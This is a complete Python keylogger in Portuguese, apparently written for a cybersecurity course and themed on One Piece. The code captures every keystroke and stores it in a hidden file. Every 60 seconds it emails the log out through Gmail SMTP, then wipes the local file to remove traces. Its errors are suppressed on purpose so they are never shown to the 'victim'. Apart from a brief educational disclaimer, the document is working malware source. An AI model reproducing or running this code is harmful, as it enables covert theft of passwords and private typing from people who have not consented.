#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║     🐚  GOLDEN DEN DEN MUSHI — KEYLOGGER SIM         ║
║          Project Poneglyph | Cybersecurity DIO       ║
╚══════════════════════════════════════════════════════╝

Simula um keylogger educacional: captura teclas, salva em
arquivo oculto local e (opcionalmente) envia por e-mail.

⚠️  AVISO: Script de uso EXCLUSIVAMENTE educacional.
    Execute apenas em ambientes isolados (VM / sandbox).

Configuração de e-mail (opcional):
  export EMAIL_USER="seu-email@gmail.com"
  export EMAIL_PASS="sua-senha-de-aplicativo"
"""

import os
import sys
import threading
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ── Dependência opcional ───────────────────────────────────────────────────────
try:
    import pynput.keyboard
except ImportError:
    import subprocess
    print("[*] Instalando dependência 'pynput'...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "--quiet"])
    import pynput.keyboard

# ── Constantes ────────────────────────────────────────────────────────────────
LOG_FILE         = ".sys_temp_data.txt"   # Arquivo oculto (Unix)
INTERVALO_EMAIL  = 60                     # Segundos entre envios
SMTP_HOST        = "smtp.gmail.com"
SMTP_PORT        = 465

# Teclas que não geram caractere visível — mapeadas para tags legíveis
MAPA_TECLAS: dict = {}   # preenchido após import do pynput

# Teclas completamente ignoradas (modificadores sem ação)
TECLAS_IGNORADAS: set = {}

# ── Classe principal ───────────────────────────────────────────────────────────

class GoldenDenDenMushi:
    """Keylogger simulado com exfiltração opcional por e-mail."""

    def __init__(self, intervalo: int, email: str | None, senha: str | None):
        self.log     = []          # Buffer em memória
        self.intervalo = intervalo
        self.email   = email
        self.senha   = senha
        self._lock   = threading.Lock()

        # Configura mapeamentos após import do pynput
        K = pynput.keyboard.Key
        self._ignoradas = {K.shift, K.shift_r, K.ctrl_l, K.ctrl_r,
                           K.alt, K.alt_gr, K.caps_lock, K.cmd}
        self._mapa = {
            K.space:     " ",
            K.enter:     "\n[ENTER]\n",
            K.backspace: "[DEL]",
            K.tab:       "\t",
        }

    # ── Captura ──────────────────────────────────────────────────────────────

    def ao_pressionar(self, tecla) -> None:
        """Callback chamado a cada tecla pressionada."""
        if tecla in self._ignoradas:
            return

        try:
            if hasattr(tecla, "char") and tecla.char is not None:
                caractere = tecla.char
            else:
                nome = str(tecla).replace("Key.", "")
                caractere = self._mapa.get(tecla, f"[{nome}]")
        except Exception:
            caractere = "[ERR]"

        with self._lock:
            self.log.append(caractere)

        self._flush_para_disco()

    def _flush_para_disco(self) -> None:
        """Grava o buffer acumulado no arquivo de log local."""
        with self._lock:
            if not self.log:
                return
            conteudo = "".join(self.log)
            self.log.clear()

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(conteudo)
        except Exception:
            pass  # Furtividade: falha silenciosa

    # ── Exfiltração ──────────────────────────────────────────────────────────

    def enviar_para_marineford(self) -> None:
        """Envia o log acumulado por e-mail (se credenciais estiverem disponíveis)."""
        if not (self.email and self.senha and os.path.exists(LOG_FILE)):
            return

        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                conteudo = f.read()

            if not conteudo.strip():
                return

            msg = MIMEMultipart()
            msg["From"]    = self.email
            msg["To"]      = self.email
            msg["Subject"] = "📦 ALERTA CP9 — Relatório de Espionagem"
            msg.attach(MIMEText(f"Teclas interceptadas:\n\n{conteudo}", "plain"))

            ctx = ssl.create_default_context()
            with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=ctx) as srv:
                srv.login(self.email, self.senha)
                srv.sendmail(self.email, self.email, msg.as_string())

            # Apaga rastros locais após envio bem-sucedido
            open(LOG_FILE, "w").close()

        except Exception:
            pass  # Furtividade: nunca expor erros à vítima

    def _ciclo_de_relatorio(self) -> None:
        """Dispara o envio e reagenda o próximo ciclo."""
        self.enviar_para_marineford()
        t = threading.Timer(self.intervalo, self._ciclo_de_relatorio)
        t.daemon = True
        t.start()

    # ── Inicialização ─────────────────────────────────────────────────────────

    def iniciar(self) -> None:
        print("[*] Den Den Mushi ativado. Escutando teclas...")
        if not (self.email and self.senha):
            print("[*] Modo offline: logs salvos apenas em disco (e-mail não configurado).")
        print("[!] Pressione CTRL+C no terminal para encerrar.\n")

        try:
            with pynput.keyboard.Listener(on_press=self.ao_pressionar) as ouvinte:
                self._ciclo_de_relatorio()
                ouvinte.join()
        except KeyboardInterrupt:
            self._flush_para_disco()
            print("\n[*] Den Den Mushi encerrado. Operação abortada.")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    EMAIL_VAR = os.environ.get("EMAIL_USER")
    SENHA_VAR = os.environ.get("EMAIL_PASS")

    agente = GoldenDenDenMushi(
        intervalo=INTERVALO_EMAIL,
        email=EMAIL_VAR,
        senha=SENHA_VAR,
    )
    agente.iniciar()
